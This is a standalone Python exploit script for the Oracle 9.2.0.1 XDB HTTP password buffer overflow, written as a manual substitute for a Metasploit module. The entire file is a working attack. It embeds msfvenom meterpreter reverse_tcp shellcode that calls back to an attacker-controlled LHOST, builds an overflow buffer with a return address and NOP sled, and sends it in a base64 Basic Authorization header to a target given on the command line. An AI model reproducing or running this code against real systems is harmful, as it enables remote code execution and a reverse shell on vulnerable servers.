#!/usr/bin/python
# Oracle 9.2.0.1 - Universal XDB HTTP Pass Overflow
# Metasploit module can be found here: https://www.exploit-db.com/exploits/1365
# This is the manual implementation of the Oracle 9.2.0.1 HTTP pass overflow, for those of you who doesn't want to use metasploit :D

import socket, os, sys, base64

if len(sys.argv) < 2:
	print('[*] Usage: Oracle-HTTP-Overflow.py <Target IP> <Target Port>')
	exit()

#msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.161 LPORT=4444 -f python -v payload -b '\x00'
#use multi handler to receive the shell (works best)

payload =  ""
payload += "\xdb\xcc\xd9\x74\x24\xf4\x5a\xbb\x8a\xce\x42\xab"
payload += "\x29\xc9\xb1\x56\x83\xc2\x04\x31\x5a\x14\x03\x5a"
payload += "\x9e\x2c\xb7\x57\x76\x32\x38\xa8\x86\x53\xb0\x4d"
payload += "\xb7\x53\xa6\x06\xe7\x63\xac\x4b\x0b\x0f\xe0\x7f"
payload += "\x98\x7d\x2d\x8f\x29\xcb\x0b\xbe\xaa\x60\x6f\xa1"
payload += "\x28\x7b\xbc\x01\x11\xb4\xb1\x40\x56\xa9\x38\x10"
payload += "\x0f\xa5\xef\x85\x24\xf3\x33\x2d\x76\x15\x34\xd2"
payload += "\xce\x14\x15\x45\x45\x4f\xb5\x67\x8a\xfb\xfc\x7f"
payload += "\xcf\xc6\xb7\xf4\x3b\xbc\x49\xdd\x72\x3d\xe5\x20"
payload += "\xbb\xcc\xf7\x65\x7b\x2f\x82\x9f\x78\xd2\x95\x5b"
payload += "\x03\x08\x13\x78\xa3\xdb\x83\xa4\x52\x0f\x55\x2e"
payload += "\x58\xe4\x11\x68\x7c\xfb\xf6\x02\x78\x70\xf9\xc4"
payload += "\x09\xc2\xde\xc0\x52\x90\x7f\x50\x3e\x77\x7f\x82"
payload += "\xe1\x28\x25\xc8\x0f\x3c\x54\x93\x47\xf1\x55\x2c"
payload += "\x97\x9d\xee\x5f\xa5\x02\x45\xc8\x85\xcb\x43\x0f"
payload += "\x9c\xdc\x73\xdf\x26\x8c\x8d\xe0\x56\x84\x49\xb4"
payload += "\x06\xbe\x78\xb5\xcd\x3e\x84\x60\x7b\x35\x12\x81"
payload += "\x70\x49\x43\xfd\x84\x49\x92\xa2\x01\xaf\xc4\x0a"
payload += "\x41\x60\xa5\xfa\x21\xd0\x4d\x11\xae\x0f\x6d\x1a"
payload += "\x65\x38\x04\xf5\xd3\x10\xb1\x6c\x7e\xea\x20\x70"
payload += "\x55\x96\x63\xfa\x5f\x66\x2d\x0b\x2a\x74\x5a\x6c"
payload += "\xd4\x84\x9b\x19\xd4\xee\x9f\x8b\x83\x86\x9d\xea"
payload += "\xe3\x08\x5d\xd9\x70\x4e\xa1\x9c\x40\x24\x94\x0a"
payload += "\xec\x52\xd9\xda\xec\xa2\x8f\xb0\xec\xca\x77\xe1"
payload += "\xbf\xef\x77\x3c\xac\xa3\xed\xbf\x84\x10\xa5\xd7"
payload += "\x2a\x4e\x81\x77\xd5\xa5\x91\x70\x29\x3b\xbe\xd8"
payload += "\x41\xc3\xfe\xd8\x91\xa9\xfe\x88\xf9\x26\xd0\x27"
payload += "\xc9\xc7\xfb\x6f\x41\x4d\x6a\xdd\xf0\x52\xa7\x83"
payload += "\xac\x53\x44\x18\x5f\x29\x25\x9f\xa0\xce\x2f\xc4"
payload += "\xa1\xce\x4f\xfa\x9e\x18\x76\x88\xe1\x98\xcd\x83"
payload += "\x54\xbc\x64\x0e\x96\x92\x77\x1b"


target_ip = sys.argv[1]
target_port = sys.argv[2]

ret = "\x46\x6d\x61\x60\x0a"
Prepend = "\x81\xc4\xff\xef\xff\xff\x44"

splat = "meta:" + ('a' * 442) + "\xeb\x64\x42\x42" + ret + "wwwwoooottttsssshhhhllll" + ("\x90" * 242) + "\xeb\x10" + ("\x90" * 109) + Prepend + payload

exploit = (	"GET / HTTP/1.1" + "\r\n" +
			"Host: " + target_ip + ":" + target_port + "\r\n" +
			"User-Agent: Mozilla/5.0 (X11; U; Linux i686;" +
			"en-US; rv:1.7.12) Gecko/20050923" + "\r\n" +
			"Accept: text/xml,application/xml,application" +
			"/xhtml+xml,text/html;q=0.9,text/plain;q=0.8," +
			"image/png,*/*;q=0.5" + "\r\n" +
			"Accept-Language: en-us,en;q=0.5" + "\r\n" +
			"Accept-Encoding: gzip,deflate" + "\r\n" +
			"Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7" + "\r\n" +
			"Keep-Alive: 300" + "\r\n" +
			"Connection: keep-alive" + "\r\n" +
			"Authorization: Basic " + base64.b64encode(splat) + "\r\n\r\n")


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)		# Declare a TCP socket
sock.connect((target_ip, int(target_port)))						# Connect to target host
sock.sendall(exploit)											# Send the exploit over TCP to the nominated addresses